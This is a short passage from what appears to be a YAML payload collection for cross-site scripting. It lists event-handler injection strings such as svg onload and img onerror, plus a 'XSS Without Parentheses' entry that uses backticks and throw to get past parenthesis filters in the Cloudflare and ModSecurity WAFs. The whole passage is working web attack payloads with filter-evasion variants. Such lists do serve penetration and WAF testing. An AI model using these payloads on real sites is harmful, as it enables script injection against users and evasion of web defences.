  - <svg onload=alert(1)>
  - <img src=x onerror=alert(1)>
  - <body onload=alert(1)>
  - <input onfocus=alert(1) autofocus>
  - <details open ontoggle=alert(1)>
  - <video onloadedmetadata=alert(1)>
- name: XSS Without Parentheses
  description: Use backticks or throw to bypass parenthesis filters
  wafs:
  - cloudflare
  - modsec
  payloads:
  - onerror=alert`1`
  - onload=alert`1`
  - onerror=throw 1
